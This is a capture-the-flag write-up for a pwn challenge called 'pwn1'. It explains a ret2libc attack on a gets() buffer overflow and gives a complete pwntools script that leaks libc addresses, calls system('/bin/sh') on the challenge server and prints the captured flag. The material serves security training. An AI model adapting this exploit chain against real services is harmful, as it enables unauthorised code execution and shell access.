# pwn1 Challenge Writeup

> **Category**: Pwn\
> **Author**: Stefan

## TL;DR
A relatively simple ret2libc.

---

## Challenge Description
Upon opening the challenge in Ghidra, we had a simple `gets()` and a `puts()` with user input. The goal was to leak the libc address and then use it to get a shell. The buffer was 128 characters long, and I encountered the first problem here:

<img src="https://i.imgur.com/1R2SXOz.png" alt="Writeup_image_1" width="500"/>

## Solution
### Step 1: Identifying the Correct Offset
I initially took the offset from RBP, but I should have looked at the disassembly and taken it from the return address instead. The correct offset was 136 for the RIP register, not 128 as it appeared with RBP.

> **Note**: The RSP register contained the same string as RIP because the main function ended with `leave ret` (function epilogue).

<img src="https://i.imgur.com/0lhtOWs.png" alt="Writeup_image_2" width="500"/>

### Step 2: Fixing the Leak
~~The second issue was that the leak only worked remotely when using `gets` (I'm not sure why).~~
~~As a result, I also had to change the calculation of `libc_base` to use `gets`.~~

<img src="https://i.imgur.com/sITr0BE.png" alt="Writeup_image_3" width="200"/>

The issue was the usage of `strip()`, which removed the last byte. Changing to `strip(b'\n')` fixed this.

### Step 3: Running the Exploit
With the final exploit file, I ran the solve script with the `r` argument and we got a shell.

<img src="https://i.imgur.com/lPsXMez.png" alt="Writeup_image_4" width="500"/>

## Exploit
```python
from pwn import *
import sys

binary = "./main"
remote_conn = "34.107.71.117 32222"
context.log_level = "critical"

if len(sys.argv) > 1 and sys.argv[1] == "l":
    r = process(binary)
    elf = context.binary = ELF(binary)
elif len(sys.argv) > 1 and sys.argv[1] == "r":
    r = remote(remote_conn.split(" ")[0], int(remote_conn.split(" ")[1]))
    elf = ELF(binary)
else:
    print("Usage: python " + sys.argv[0] + " [l|r]")
    sys.exit()

pop_rdi_ret = 0x00000000004011f3
ret = 0x000000000040101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

payload = b"A" * 136
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
r.sendline(payload)
r.recvline()
leak_puts = u64(r.recvline().strip(b'\n').ljust(8, b"\x00"))
print("leak puts: ", hex(leak_puts))

payload = b"A" * 136
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(elf.got["gets"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
r.sendline(payload)
r.recvline()
leak_gets = u64(r.recvline().strip(b'\n').ljust(8, b"\x00"))
print("leak gets: ", hex(leak_gets))

if(sys.argv[1] == 'l'):
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc=ELF("./libctarget.so")

libc.address = leak_gets - libc.sym["gets"]
bin_sh = next(libc.search(b"/bin/sh"))
print("libc base: ", hex(libc.address))
print("/bin/sh: ", hex(bin_sh))
print("system: ", hex(libc.sym["system"]))
payload = b"A" * 136
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(libc.sym["system"])

if(sys.argv[1] == "l"):
    gdb.attach(r)

r.sendline(payload)
r.recvline()
r.interactive()
```
## Flag
`CTF{5d312f4b79a334445d084d7eec892bc0a3bec1454e585c4117310b9600e6c1f0}`
